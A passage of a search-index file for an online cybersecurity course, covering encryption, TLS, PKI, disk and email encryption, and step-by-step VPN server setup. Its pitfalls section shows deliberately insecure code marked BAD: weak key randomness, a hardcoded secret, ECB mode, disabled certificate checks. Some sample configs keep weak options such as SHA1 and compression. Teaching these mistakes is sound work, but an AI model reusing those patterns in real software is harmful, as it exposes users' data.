just about the math\u2014it's about the entire ecosystem.","title":"Understanding Encryption Systems"},{"location":"LECTURES/unit11/lesson11-1/#transport-layer-security-tls","text":"TLS (formerly SSL) is the foundation of secure internet communication. Every HTTPS website uses TLS.","title":"Transport Layer Security (TLS)"},{"location":"LECTURES/unit11/lesson11-1/#tls-handshake-process","text":"When you visit https://example.com, here's what happens: 1. Client Hello - Client sends: TLS version, supported cipher suites, random number - Example cipher suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 2. Server Hello - Server responds: Chosen cipher suite, random number - Server sends certificate (public key + identity) 3. Certificate Verification - Client validates certificate chain - Checks: CA signature, expiration, revocation status, domain name 4. Key Exchange Using chosen method (e.g., ECDHE - Elliptic Curve Diffie-Hellman Ephemeral): - Client and server compute shared secret - This becomes the symmetric key 5. Finished Messages - Both sides send encrypted confirmation - Handshake complete 6. Application Data - All subsequent traffic encrypted with AES (or chosen symmetric cipher) - Fast symmetric encryption for bulk data - Keys unique to this session","title":"TLS Handshake Process"},{"location":"LECTURES/unit11/lesson11-1/#tls-versions","text":"SSL 2.0 / 3.0 : DEPRECATED - broken, do not use TLS 1.0 / 1.1 : DEPRECATED - vulnerable, being phased out TLS 1.2 : Current standard, widely supported TLS 1.3 : Latest version, faster and more secure TLS 1.3 improvements: - Fewer cipher suites (removed weak options) - Faster handshake (0-RTT mode) - Forward secrecy by default - Simplified protocol","title":"TLS Versions"},{"location":"LECTURES/unit11/lesson11-1/#certificate-authorities-and-pki","text":"Certificate : Digital document binding public key to identity Contents: - Subject (domain name, organization) - Issuer (CA that signed it) - Validity period - Public key - Signature (CA's private key) Certificate chain: Root CA (in browser trust store) \u2193 Intermediate CA \u2193 End-entity certificate (example.com) Validation process: 1. Browser receives certificate 2. Checks signature from Intermediate CA 3. Checks Intermediate CA signed by Root CA 4. Root CA in browser's trust store? \u2192 Valid! Certificate types: - DV (Domain Validated) : Proves domain ownership only - OV (Organization Validated) : Verifies organization identity - EV (Extended Validation) : Strictest verification (shows green bar) Certificate revocation: - CRL (Certificate Revocation List) : Published list of revoked certificates - OCSP (Online Certificate Status Protocol) : Real-time status check - OCSP Stapling : Server provides OCSP response, reduces latency","title":"Certificate Authorities and PKI"},{"location":"LECTURES/unit11/lesson11-1/#perfect-forward-secrecy-pfs","text":"Problem : If server's private key is compromised, attacker can decrypt past traffic. Solution : Ephemeral key exchange (DHE, ECDHE) - Session keys derived from temporary keys - Temporary keys discarded after session - Compromise of server key doesn't compromise past sessions Cipher suites with PFS: - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 \u2713 - TLS_RSA_WITH_AES_256_GCM_SHA384 \u2717 (no PFS)","title":"Perfect Forward Secrecy (PFS)"},{"location":"LECTURES/unit11/lesson11-1/#tls-best-practices","text":"Configuration: # Disable old versions ssl_protocols TLSv1.2 TLSv1.3; # Strong cipher suites only ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'; # Prefer server cipher suite order ssl_prefer_server_ciphers on; # HSTS (force HTTPS) add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; Testing: - SSL Labs Server Test (ssllabs.com/ssltest) - Check cipher suite support - Verify certificate chain - Test for vulnerabilities","title":"TLS Best Practices"},{"location":"LECTURES/unit11/lesson11-1/#vpn-technologies","text":"Virtual Private Networks create encrypted tunnels over untrusted networks.","title":"VPN Technologies"},{"location":"LECTURES/unit11/lesson11-1/#ipsec","text":"IPsec (Internet Protocol Security) secures IP communications. Modes: - Transport mode : Encrypts payload only, original IP header intact - Tunnel mode : Encrypts entire packet, new IP header added Protocols: - AH (Authentication Header) : Authentication and integrity, no encryption - ESP (Encapsulating Security Payload) : Authentication, integrity, and encryption Key exchange: - IKE (Internet Key Exchange) : Establishes security associations (SAs) - Phase 1: Establish secure channel - Phase 2: Negotiate IPsec parameters Use cases: - Site-to-site VPNs (connecting branch offices) - Remote access VPNs - Securing cloud connections","title":"IPsec"},{"location":"LECTURES/unit11/lesson11-1/#openvpn","text":"Open-source VPN using SSL/TLS. Advantages: - Highly configurable - Works over TCP or UDP - Bypasses most firewalls - Strong encryption (AES-256) - Cross-platform Configuration example: # Server config port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh2048.pem server 10.8.0.0 255.255.255.0 cipher AES-256-CBC auth SHA256","title":"OpenVPN"},{"location":"LECTURES/unit11/lesson11-1/#wireguard","text":"Modern VPN protocol, simpler and faster than OpenVPN or IPsec. Features: - Minimal codebase (~4,000 lines vs. OpenVPN's ~100,000) - Modern cryptography (Curve25519, ChaCha20, Poly1305) - Fast performance - Built into Linux kernel Configuration: [Interface] PrivateKey = <private_key> Address = 10.0.0.1/24 ListenPort = 51820 [Peer] PublicKey = <peer_public_key> AllowedIPs = 10.0.0.2/32 Use cases: - Point-to-point VPNs - Simple site-to-site connections - Mobile VPN clients","title":"WireGuard"},{"location":"LECTURES/unit11/lesson11-1/#vpn-protocols-comparison","text":"Protocol Speed Security Complexity Best For IPsec Medium High High Site-to-site OpenVPN Medium High Medium General purpose WireGuard Fast High Low Modern implementations L2TP/IPsec Slow Medium Medium Legacy compatibility PPTP Fast Low Low Don't use","title":"VPN Protocols Comparison"},{"location":"LECTURES/unit11/lesson11-1/#disk-encryption","text":"Protecting data at rest.","title":"Disk Encryption"},{"location":"LECTURES/unit11/lesson11-1/#full-disk-encryption-fde","text":"Encrypts entire disk, transparent to user after boot. BitLocker (Windows): # Enable BitLocker Enable-BitLocker -MountPoint \"C:\" -EncryptionMethod Aes256 -UsedSpaceOnly # Backup recovery key Backup-BitLockerKeyProtector -MountPoint \"C:\" -KeyProtectorId $KeyProtectorId FileVault (macOS): - System Preferences \u2192 Security & Privacy \u2192 FileVault - Recovery key backed up to iCloud or stored locally LUKS (Linux): # Create encrypted partition cryptsetup luksFormat /dev/sdb1 # Open encrypted partition cryptsetup luksOpen /dev/sdb1 encrypted_volume # Format and mount mkfs.ext4 /dev/mapper/encrypted_volume mount /dev/mapper/encrypted_volume /mnt/encrypted","title":"Full Disk Encryption (FDE)"},{"location":"LECTURES/unit11/lesson11-1/#self-encrypting-drives-seds","text":"Hardware-based encryption in the drive itself. Advantages: - No performance impact - Encryption always on - Instant secure erase (destroy key) - OS-independent Standards: - TCG Opal - eDrive (Microsoft) Considerations: - Trust the manufacturer - Firmware vulnerabilities possible - Key stored on drive","title":"Self-Encrypting Drives (SEDs)"},{"location":"LECTURES/unit11/lesson11-1/#filefolder-encryption","text":"Encrypt specific files or folders. Tools: - GPG : Command-line encryption # Encrypt file gpg --encrypt --recipient user@example.com file.txt # Decrypt file gpg --decrypt file.txt.gpg > file.txt VeraCrypt : Encrypted containers and partitions 7-Zip : Encrypted archives AxCrypt : User-friendly file encryption","title":"File/Folder Encryption"},{"location":"LECTURES/unit11/lesson11-1/#email-encryption","text":"Email is inherently insecure (travels through multiple servers, stored unencrypted).","title":"Email Encryption"},{"location":"LECTURES/unit11/lesson11-1/#smime","text":"S/MIME (Secure/Multipurpose Internet Mail Extensions) uses certificates. How it works: 1. Obtain S/MIME certificate from CA 2. Install in email client 3. Send digitally signed emails (proves sender) 4. Encrypt emails with recipient's public key Advantages: - Built into most email clients - Centralized certificate management - Corporate PKI integration Disadvantages: - Requires certificate from CA (cost) - Recipients need certificates too","title":"S/MIME"},{"location":"LECTURES/unit11/lesson11-1/#pgpgpg","text":"PGP (Pretty Good Privacy) / GPG (GNU Privacy Guard) use web of trust model. How it works: 1. Generate key pair gpg --gen-key Share public key gpg --export --armor user@example.com > public_key.asc Encrypt email gpg --encrypt --recipient recipient@example.com message.txt Web of Trust: - No central authority - Users sign each other's keys - Trust based on signatures Advantages: - Free and open source - No dependence on CAs - Strong community Disadvantages: - Complex for non-technical users - Key management challenges - Not widely adopted","title":"PGP/GPG"},{"location":"LECTURES/unit11/lesson11-1/#end-to-end-encryption-e2ee","text":"Messages encrypted on sender's device, decrypted only on recipient's device. Service provider can't read them.","title":"End-to-End Encryption (E2EE)"},{"location":"LECTURES/unit11/lesson11-1/#signal-protocol","text":"Used by Signal, WhatsApp, Facebook Messenger (secret conversations). Features: - Double Ratchet Algorithm : Keys constantly change - Forward secrecy : Past messages safe if keys compromised - Future secrecy : Future messages safe too - Deniability : Can't prove who sent message How it works: 1. Initial key exchange (using identity keys) 2. Each message uses ephemeral keys 3. Keys \"ratchet\" forward after each message 4. Old keys destroyed Security properties: - End-to-end encryption - Authentication (know who you're talking to) - Forward secrecy - Break-in recovery (compromise is temporary)","title":"Signal Protocol"},{"location":"LECTURES/unit11/lesson11-1/#other-e2ee-systems","text":"Matrix/Element: - Decentralized messaging - End-to-end encryption - Open protocol Telegram (Secret Chats): - MTProto protocol - Optional E2EE (not default) - Device-specific (no cloud sync) iMessage: - Apple's E2EE messaging - Seamless user experience - Closed-source","title":"Other E2EE Systems"},{"location":"LECTURES/unit11/lesson11-1/#blockchain-and-cryptocurrency","text":"Cryptography enables decentralized trustless systems.","title":"Blockchain and Cryptocurrency"},{"location":"LECTURES/unit11/lesson11-1/#bitcoin-fundamentals","text":"Public/Private Keys: - Private key: Random 256-bit number (keep secret!) - Public key: Derived from private key (elliptic curve cryptography) - Address: Hash of public key (what you share) Transaction signing: 1. Create transaction (sending Bitcoin) 2. Hash transaction data 3. Sign hash with private key (ECDSA) 4. Broadcast transaction + signature 5. Network verifies signature with public key Blockchain: - Chain of blocks - Each block contains: - Transactions - Timestamp - Hash of previous block - Nonce (for mining) Mining (Proof of Work): Hash(Block Data + Nonce) must be < Target Miners try different nonces First to find valid hash wins block reward Difficulty adjusts to maintain ~10 min block time Security: - Immutability (changing past blocks requires recalculating all subsequent blocks) - Consensus (longest chain is truth) - 51% attack would require more computing power than rest of network","title":"Bitcoin Fundamentals"},{"location":"LECTURES/unit11/lesson11-1/#ethereum-and-smart-contracts","text":"Smart contracts : Programs on blockchain Example simple contract: contract SimpleStorage { uint storedData; function set(uint x) public { storedData = x; } function get() public view returns (uint) { return storedData; } } Cryptographic elements: - Same public/private key cryptography as Bitcoin - Transactions signed with private key - Contract code executed by all nodes - State changes recorded on blockchain","title":"Ethereum and Smart Contracts"},{"location":"LECTURES/unit11/lesson11-1/#quantum-resistant-cryptography","text":"Quantum computers threaten current cryptography:","title":"Quantum-Resistant Cryptography"},{"location":"LECTURES/unit11/lesson11-1/#whats-at-risk","text":"RSA and ECC : Shor's algorithm can break these on quantum computers Symmetric encryption : Grover's algorithm speeds up brute force, but doubling key size mitigates risk - AES-128 \u2192 AES-256 remains secure","title":"What's at Risk?"},{"location":"LECTURES/unit11/lesson11-1/#post-quantum-algorithms","text":"NIST is standardizing new algorithms: Lattice-based: - CRYSTALS-Kyber (key exchange) - CRYSTALS-Dilithium (digital signatures) Hash-based: - SPHINCS+ (digital signatures) Code-based: - Classic McEliece (key exchange) Migration timeline: - Standards published: 2024 - Implementation: 2025-2030 - Full migration: 2030s Preparation: - Use crypto-agility (easy to swap algorithms) - Monitor quantum computing progress - Plan migration strategy","title":"Post-Quantum Algorithms"},{"location":"LECTURES/unit11/lesson11-1/#hardware-security-modules-hsms","text":"Physical devices that safeguard cryptographic keys. Features: - Tamper-resistant hardware - Key generation in secure environment - Keys never leave device - FIPS 140-2/140-3 certified Use cases: - Certificate authorities - Payment processing - Code signing - Database encryption keys - Cryptocurrency exchanges Types: - General-purpose HSMs : Thales, Utimaco - Cloud HSMs : AWS CloudHSM, Azure Dedicated HSM - Payment HSMs : Specialized for financial transactions","title":"Hardware Security Modules (HSMs)"},{"location":"LECTURES/unit11/lesson11-1/#trusted-platform-module-tpm","text":"Microchip on motherboard providing hardware-based security. Functions: - Secure key storage - Random number generation - Platform integrity measurement - Attestation (prove system state) Uses: - BitLocker encryption - Secure boot - Device authentication - Protection of encryption keys TPM 2.0: - Current standard - Algorithm agility - Better performance - Required for Windows 11","title":"Trusted Platform Module (TPM)"},{"location":"LECTURES/unit11/lesson11-1/#secure-enclaves","text":"Isolated execution environments within CPUs. Intel SGX (Software Guard Extensions): - Encrypted memory regions (enclaves) - Code and data protected from OS and hypervisor - Remote attestation ARM TrustZone: - Separate secure world - Used in mobile devices - Fingerprint data, secure payments Apple Secure Enclave: - Dedicated processor - Stores biometric data - Manages encryption keys","title":"Secure Enclaves"},{"location":"LECTURES/unit11/lesson11-1/#key-management-best-practices","text":"","title":"Key Management Best Practices"},{"location":"LECTURES/unit11/lesson11-1/#key-lifecycle","text":"1. Generation: - Use cryptographically secure random number generators - Generate keys in secure environment - Adequate key length 2. Storage: - Encrypt keys (key encryption keys) - Use HSMs for critical keys - Access control - Audit logging 3. Distribution: - Secure key exchange protocols - Out-of-band verification - Split knowledge (no single person has full key) 4. Usage: - Limit key lifetime - Usage restrictions (what can key be used for) - Rate limiting 5. Rotation: - Regular key rotation - Re-encrypt data with new keys - Overlap period (old and new keys both valid) 6. Destruction: - Secure deletion (overwrite) - Destroy all copies - Document destruction","title":"Key Lifecycle"},{"location":"LECTURES/unit11/lesson11-1/#key-escrow-and-recovery","text":"Problem : What if keys are lost? Solutions: Key Escrow: - Trusted third party holds key copy - Strict controls on access - Used in some enterprise settings M-of-N: - Key split into N parts - M parts needed to reconstruct - Example: 3-of-5 (any 3 of 5 people can recover) Secret Sharing (Shamir): - Mathematical scheme for splitting secrets - Threshold scheme (need minimum shares) Considerations: - Recovery vs. security trade-off - Compliance requirements - User trust","title":"Key Escrow and Recovery"},{"location":"LECTURES/unit11/lesson11-1/#cryptographic-protocols-in-practice","text":"","title":"Cryptographic Protocols in Practice"},{"location":"LECTURES/unit11/lesson11-1/#ssh-secure-shell","text":"Remote access with strong authentication and encryption. Key-based authentication: # Generate key pair ssh-keygen -t ed25519 # Copy public key to server ssh-copy-id user@server # Connect (no password needed) ssh user@server SSH tunneling: # Local port forwarding ssh -L 8080:localhost:80 user@server # Dynamic port forwarding (SOCKS proxy) ssh -D 1080 user@server Best practices: - Disable password authentication - Use strong key types (ed25519, rsa 4096) - Regularly rotate keys - Monitor authorized_keys files","title":"SSH (Secure Shell)"},{"location":"LECTURES/unit11/lesson11-1/#tor-the-onion-router","text":"Anonymous communication using layered encryption. How it works: User \u2192 Entry Node \u2192 Middle Node \u2192 Exit Node \u2192 Destination Each layer encrypted separately: - Exit node sees traffic to destination (no source) - Entry node sees source (no destination) - Middle node sees neither Uses: - Anonymous browsing - Censorship circumvention - Whistleblowing - Privacy protection Limitations: - Slow (multiple hops) - Exit node can see unencrypted traffic - Timing attacks possible - Not foolproof anonymity","title":"Tor (The Onion Router)"},{"location":"LECTURES/unit11/lesson11-1/#implementation-pitfalls","text":"Common mistakes that weaken encryption systems:","title":"Implementation Pitfalls"},{"location":"LECTURES/unit11/lesson11-1/#1-weak-random-number-generation","text":"# BAD import random key = random.randint(0, 2**256) # GOOD import secrets key = secrets.randbelow(2**256)","title":"1. Weak Random Number Generation"},{"location":"LECTURES/unit11/lesson11-1/#2-improper-key-storage","text":"# BAD API_KEY = \"secret123\" # Hardcoded in source # BETTER API_KEY = os.environ.get('API_KEY') # Environment variable # BEST # Use key management service (AWS KMS, Azure Key Vault, HashiCorp Vault)","title":"2. Improper Key Storage"},{"location":"LECTURES/unit11/lesson11-1/#3-ecb-mode","text":"# BAD - patterns visible in ciphertext cipher = AES.new(key, AES.MODE_ECB) # GOOD - use authenticated encryption cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)","title":"3. ECB Mode"},{"location":"LECTURES/unit11/lesson11-1/#4-not-verifying-certificates","text":"# BAD - disables certificate verification requests.get('https://example.com', verify=False) # GOOD - verify by default requests.get('https://example.com')","title":"4. Not Verifying Certificates"},{"location":"LECTURES/unit11/lesson11-1/#5-custom-cryptography","text":"Never roll your own crypto Use established libraries: OpenSSL, libsodium, cryptography.io Implement standard algorithms correctly Get expert review for custom protocols","title":"5. Custom Cryptography"},{"location":"LECTURES/unit11/lesson11-1/#conclusion","text":"Encryption systems are complex but essential: Key principles: 1. Use standard algorithms : Don't create your own 2. Key management is critical : Keys are more valuable than data 3. Defense in depth : Encryption is one layer 4. Implementation matters : Correct use of cryptography is crucial 5. Stay current : Threats evolve, so must defenses Practical takeaways: - Use TLS 1.3 for web traffic - Enable full disk encryption - Use E2EE messaging (Signal protocol) - Implement proper key management - Plan for post-quantum migration Remember : Cryptography is a tool. Strong cryptography used incorrectly provides false security. Proper implementation, key management, and security architecture are equally important. The goal isn't just to encrypt\u2014it's to protect confidentiality, integrity, and authenticity in a way that's practical, maintainable, and resilient against evolving threats. You've now completed the cybersecurity curriculum. You understand systems from the ground up\u2014from CPU rings to encryption protocols. You know how attackers think and how defenders respond. Most importantly, you understand the ethical responsibilities that come with this knowledge. The field of cybersecurity is constantly evolving. Continue learning, practicing, and contributing to a more secure digital world.","title":"Conclusion"},{"location":"LECTURES/unit11/lesson11-2/","text":"VPN Technologies and Implementation Virtual Private Networks (VPNs) create secure tunnels over untrusted networks. This lesson covers VPN protocols, architectures, and practical implementation for both site-to-site and remote access scenarios. VPN Fundamentals What VPNs Provide Security services: - Confidentiality - Encryption protects data in transit - Integrity - Detects tampering - Authentication - Verifies identity of endpoints - Access Control - Restricts who can connect Use cases: - Remote worker access - Site-to-site connectivity - Privacy protection - Bypass geo-restrictions - Secure public Wi-Fi usage VPN Types Remote Access VPN: - Individual user connects to corporate network - Client software on user device - Examples: OpenVPN, WireGuard, Cisco AnyConnect Site-to-Site VPN: - Connect entire networks together - Router-to-router connection - Transparent to end users - Examples: IPsec tunnels SSL/TLS VPN: - Browser-based access - No client software needed - Limited functionality - Examples: Cisco SSL VPN, Fortinet IPsec VPN IPsec Components Security Associations (SA): - Defines security parameters - One-way (need two for bidirectional) - Identified by SPI (Security Parameter Index) Protocols: AH (Authentication Header): - Provides authentication and integrity - No encryption - Protects IP header - Rarely used alone ESP (Encapsulating Security Payload): - Provides encryption, authentication, integrity - Most common - Doesn't protect outer IP header Modes: Transport Mode: - Encrypts only payload - Original IP header preserved - Used for end-to-end communication - More efficient Tunnel Mode: - Encrypts entire IP packet - New IP header added - Used for site-to-site VPNs - More secure IPsec Configuration Phase 1 (IKE Phase 1) - ISAKMP SA: Establishes secure channel for negotiation. Main Mode (6 messages): Initiator \u2192 Responder: SA proposal Responder \u2192 Initiator: SA acceptance Initiator \u2192 Responder: Key exchange Responder \u2192 Initiator: Key exchange Initiator \u2192 Responder: Authentication Responder \u2192 Initiator: Authentication Aggressive Mode (3 messages): - Faster but less secure - Identity sent in clear - Used when IP address changes Phase 1 parameters: - Encryption: AES-256, AES-128, 3DES - Hash: SHA-256, SHA-1, MD5 - Authentication: Pre-shared key, certificates - DH Group: 2, 5, 14, 15, 16, 19, 20 - Lifetime: 86400 seconds (24 hours) Phase 2 (IKE Phase 2) - IPsec SA: Negotiates parameters for actual data encryption. Quick Mode: - Uses Phase 1 channel - Negotiates IPsec parameters - Can create multiple Phase 2 SAs Phase 2 parameters: - Protocol: ESP or AH - Encryption: AES-256, AES-128 - Authentication: SHA-256, SHA-1 - PFS (Perfect Forward Secrecy): DH group - Lifetime: 3600 seconds (1 hour) StrongSwan IPsec Configuration Install StrongSwan: sudo apt update sudo apt install strongswan strongswan-pki Generate certificates: # Generate CA key ipsec pki --gen --type rsa --size 4096 --outform pem > ca.key.pem # Generate CA certificate ipsec pki --self --ca --lifetime 3650 \\ --in ca.key.pem --type rsa \\ --dn \"CN=VPN CA\" \\ --outform pem > ca.cert.pem # Generate server key ipsec pki --gen --type rsa --size 4096 --outform pem > server.key.pem # Generate server certificate ipsec pki --pub --in server.key.pem --type rsa | \\ ipsec pki --issue --lifetime 1825 \\ --cacert ca.cert.pem --cakey ca.key.pem \\ --dn \"CN=vpn.example.com\" --san vpn.example.com \\ --flag serverAuth --flag ikeIntermediate \\ --outform pem > server.cert.pem # Copy to system sudo cp ca.cert.pem /etc/ipsec.d/cacerts/ sudo cp server.cert.pem /etc/ipsec.d/certs/ sudo cp server.key.pem /etc/ipsec.d/private/ Configure /etc/ipsec.conf: config setup charondebug=\"ike 2, knl 2, cfg 2, net 2, esp 2, dmn 2, mgr 2\" strictcrlpolicy=no uniqueids=yes conn ikev2-vpn auto=add compress=no type=tunnel keyexchange=ikev2 fragmentation=yes forceencaps=yes # IKE Phase 1 ike=aes256-sha256-modp2048,aes256-sha1-modp2048! # IKE Phase 2 esp=aes256-sha256,aes256-sha1! # Dead Peer Detection dpdaction=clear dpddelay=300s dpdtimeout=600s # Server side left=%any leftid=@vpn.example.com leftcert=server.cert.pem leftsendcert=always leftsubnet=0.0.0.0/0 # Client side right=%any rightid=%any rightauth=eap-mschapv2 rightsourceip=10.10.10.0/24 rightdns=8.8.8.8,8.8.4.4 rightsendcert=never # Automatic key renegotiation rekey=yes ikelifetime=24h lifetime=8h Configure /etc/ipsec.secrets: : RSA server.key.pem username : EAP \"password\" Enable IP forwarding: echo \"net.ipv4.ip_forward=1\" | sudo tee -a /etc/sysctl.conf sudo sysctl -p Configure firewall: # Allow IPsec sudo ufw allow 500/udp sudo ufw allow 4500/udp # NAT for VPN clients sudo iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -o eth0 -j MASQUERADE sudo iptables -A FORWARD -s 10.10.10.0/24 -j ACCEPT sudo iptables -A FORWARD -d 10.10.10.0/24 -j ACCEPT Start service: sudo systemctl restart strongswan-starter sudo systemctl enable strongswan-starter OpenVPN OpenVPN Architecture Advantages: - Works over TCP or UDP - Highly configurable - Strong encryption - Cross-platform - Can traverse NAT easily Disadvantages: - Slower than WireGuard - More complex configuration - Larger codebase OpenVPN Server Setup Install OpenVPN: sudo apt update sudo apt install openvpn easy-rsa Set up PKI: # Copy easy-rsa make-cadir ~/openvpn-ca cd ~/openvpn-ca # Edit vars file nano vars # Set KEY_COUNTRY, KEY_PROVINCE, KEY_CITY, KEY_ORG, KEY_EMAIL # Source vars source vars # Clean and build CA ./clean-all ./build-ca # Generate server certificate ./build-key-server server # Generate Diffie-Hellman parameters ./build-dh # Generate HMAC signature openvpn --genkey --secret keys/ta.key # Copy keys to OpenVPN directory sudo cp keys/{ca.crt,server.crt,server.key,dh2048.pem,ta.key} /etc/openvpn/ Configure /etc/openvpn/server.conf: # Network settings port 1194 proto udp dev tun # Certificates and keys ca ca.crt cert server.crt key server.key dh dh2048.pem # Network topology server 10.8.0.0 255.255.255.0 topology subnet # Push routes to clients push \"redirect-gateway def1 bypass-dhcp\" push \"dhcp-option DNS 8.8.8.8\" push \"dhcp-option DNS 8.8.4.4\" # Client configuration client-to-client keepalive 10 120 cipher AES-256-GCM auth SHA256 # TLS security tls-auth ta.key 0 tls-version-min 1.2 # Privileges user nobody group nogroup # Persistence persist-key persist-tun # Logging status /var/log/openvpn-status.log log-append /var/log/openvpn.log verb 3 # Optional: compression comp-lzo Enable IP forwarding and NAT: # Enable forwarding sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf sudo sysctl -p # Configure firewall sudo ufw allow 1194/udp sudo ufw allow OpenSSH # NAT for VPN clients sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE Start OpenVPN: sudo systemctl start openvpn@server sudo systemctl enable openvpn@server OpenVPN Client Configuration Generate client certificate: cd ~/openvpn-ca source vars ./build-key client1 Create client config file (client1.ovpn): client dev tun proto udp remote vpn.example.com 1194 resolv-retry infinite nobind user nobody group nogroup persist-key persist-tun remote-cert-tls server cipher AES-256-GCM auth SHA256 comp-lzo verb 3 # Inline certificates <ca> [paste contents of ca.crt] </ca> <cert> [paste contents of client1.crt] </cert> <key> [paste contents of client1.key] </key> <tls-auth> [paste contents of ta.key] </tls-auth> key-direction 1 Connect client: sudo openvpn --config client1.ovpn WireGuard WireGuard Advantages Why WireGuard is gaining popularity: - Extremely fast (faster than IPsec and OpenVPN) - Simple configuration - Modern cryptography (no cipher negotiation) - Small codebase (~4,000 lines vs OpenVPN's 100,000+) - Built into Linux kernel (5.6+) - Cross-platform Cryptography: - ChaCha20 for encryption - Poly1305 for authentication - Curve25519 for key exchange - BLAKE2s for hashing - No cipher negotiation - uses best practices only WireGuard Server Setup Install WireGuard: sudo apt update sudo apt install wireguard Generate keys: # Generate server keys wg genkey | sudo tee /etc/wireguard/server_private.key sudo chmod 600 /etc/wireguard/server_private.key sudo cat /etc/wireguard/server_private.key | wg pubkey | sudo tee /etc/wireguard/server_public.key # Generate client keys wg genkey | tee client_private.key cat client_private.key | wg pubkey > client_public.key Configure /etc/wireguard/wg0.conf: [Interface] Address = 10.0.0.1/24 ListenPort = 51820 PrivateKey = [server_private_key] # IP forwarding PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE # Client 1 [Peer] PublicKey = [client1_public_key] AllowedIPs = 10.0.0.2/32 # Client 2 [Peer] PublicKey = [client2_public_key] AllowedIPs = 10.0.0.3/32 Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1 echo \"net.ipv4.ip_forward=1\" | sudo tee -a /etc/sysctl.conf Open firewall: sudo ufw allow 51820/udp Start WireGuard: sudo wg-quick up wg0 sudo systemctl enable wg-quick@wg0 WireGuard Client Configuration Client config file (wg0-client.conf): [Interface] Address = 10.0.0.2/24 PrivateKey = [client_private_key] DNS = 8.8.8.8 [Peer] PublicKey = [server_public_key] Endpoint = vpn.example.com:51820 AllowedIPs = 0.0.0.0/0 PersistentKeepalive = 25 Connect: sudo wg-quick up wg0-client Check status: sudo wg show VPN Performance Optimization WireGuard Performance Typical throughput: - WireGuard: 1000+ Mbps - OpenVPN: 100-300 Mbps - IPsec: 400-600 Mbps Optimization tips: - Use UDP (not TCP) - Enable MTU optimization - Use modern hardware with AES-NI - Minimize latency to VPN server OpenVPN Optimization Optimize /etc/openvpn/server.conf: # Use UDP proto udp # Optimize buffer sizes sndbuf 393216 rcvbuf 393216 push \"sndbuf 393216\" push \"rcvbuf 393216\" # Use faster cipher cipher AES-128-GCM # Compression (can help or hurt depending on data) comp-lzo adaptive # Faster TLS tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256 # Optimize TCP settings tcp-nodelay VPN Security Best Practices Authentication Use strong authentication: - Certificate-based (best) - Multi-factor authentication - Avoid pre-shared keys for remote access - Rotate credentials regularly Encryption Use modern ciphers: - AES-256-GCM - ChaCha20-Poly1305 - Avoid: DES, 3DES, MD5, SHA1 Access Control Implement least privilege: - Limit which networks clients can access - Use split-tunnel when appropriate - Implement network segmentation - Log all connections Monitoring Monitor VPN usage: # OpenVPN status sudo systemctl status openvpn@server cat /var/log/openvpn-status.log # WireGuard status sudo wg show # Check connected clients sudo wg show wg0 peers Troubleshooting VPNs Common Issues Cannot connect: # Check service running sudo systemctl status openvpn@server sudo systemctl status wg-quick@wg0 # Check firewall sudo ufw status sudo iptables -L -n # Check ports sudo netstat -tulpn | grep -E '1194|51820' # Check logs sudo tail -f /var/log/openvpn.log sudo journalctl -u wg-quick@wg0 -f Connected but no internet: # Check IP forwarding sysctl net.ipv4.ip_forward # Check NAT rules sudo iptables -t nat -L -n # Test DNS dig @8.8.8.8 google.com # Check routing ip route Slow performance: # Test bandwidth iperf3 -s # On server iperf3 -c vpn_server_ip # On client # Check MTU ping -M do -s 1472 vpn_server_ip # Find optimal MTU # Monitor connections sudo tcpdump -i wg0 Key Takeaways VPN protocols: - IPsec: Industry standard, complex, good performance - OpenVPN: Flexible, widely supported, moderate performance - WireGuard: Modern, simple, best performance Implementation: - Plan architecture (site-to-site vs remote access) - Generate proper certificates - Configure encryption properly - Enable IP forwarding and NAT - Test thoroughly Security: - Use certificate-based authentication - Modern encryption algorithms - Implement access controls - Monitor and log connections - Regular updates and patches Remember: - VPNs protect data in transit only - Still need endpoint security - Performance varies by protocol - Proper configuration is critical - Test failover scenarios VPNs are fundamental to modern network security. Whether connecting remote workers or linking office locations, understanding VPN technologies lets you implement secure, reliable connectivity for your organization.","title":"Lesson 11.2"},{"location":"LECTURES/unit11/lesson11-2/#vpn-technologies-and-implementation","text":"Virtual Private Networks (VPNs) create secure tunnels over untrusted networks. This lesson covers VPN protocols, architectures, and practical implementation for both site-to-site and remote access scenarios.","title":"VPN Technologies and Implementation"},{"location":"LECTURES/unit11/lesson11-2/#vpn-fundamentals","text":"","title":"VPN Fundamentals"},{"location":"LECTURES/unit11/lesson11-2/#what-vpns-provide","text":"Security services: - Confidentiality - Encryption protects data in transit - Integrity - Detects tampering - Authentication - Verifies identity of endpoints - Access Control - Restricts who can connect Use cases: - Remote worker access - Site-to-site connectivity - Privacy protection - Bypass geo-restrictions - Secure public Wi-Fi usage","title":"What VPNs Provide"},{"location":"LECTURES/unit11/lesson11-2/#vpn-types","text":"Remote Access VPN: - Individual user connects to corporate network - Client software on user device - Examples: OpenVPN, WireGuard, Cisco AnyConnect Site-to-Site VPN: - Connect entire networks together - Router-to-router connection - Transparent to end users - Examples: IPsec tunnels SSL/TLS VPN: - Browser-based access - No client software needed - Limited functionality - Examples: Cisco SSL VPN, Fortinet","title":"VPN Types"},{"location":"LECTURES/unit11/lesson11-2/#ipsec-vpn","text":"","title":"IPsec VPN"},{"location":"LECTURES/unit11/lesson11-2/#ipsec-components","text":"Security Associations (SA): - Defines security parameters - One-way (need two for bidirectional) - Identified by SPI (Security Parameter Index) Protocols: AH (Authentication Header): - Provides authentication and integrity - No encryption - Protects IP header - Rarely used alone ESP (Encapsulating Security Payload): - Provides encryption, authentication, integrity - Most common - Doesn't protect outer IP header Modes: Transport Mode: - Encrypts only payload - Original IP header preserved - 